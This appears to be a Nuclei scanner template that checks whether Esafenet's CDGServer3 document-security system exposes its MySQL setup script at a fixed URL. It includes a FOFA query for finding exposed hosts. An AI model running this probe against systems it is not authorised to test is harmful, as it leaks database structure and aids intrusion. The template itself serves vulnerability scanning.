id: esafenet-cdgserver3-createSmartSecmysql-disclosure
info:
  name: 亿赛通电子文档安全管理系统 create_SmartSec_mysql.sql - 信息泄露
  author: leadlife
  severity: high
  description: 
  reference: 
    - 
  metadata:
    verified: true
    fofa-query: body="CDGServer3" || title="电子文档安全管理系统" || cert="esafenet" || body="/help/getEditionInfo.jsp"
  tags: esafenet,disclosure

http:
  - raw:
      - |
        GET /CDGServer3/SQL/MYSQL/create_SmartSec_mysql.sql HTTP/1.1
        Host: {{Hostname}}
        Connection: close
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains(header,'application/x-sql')
        condition: and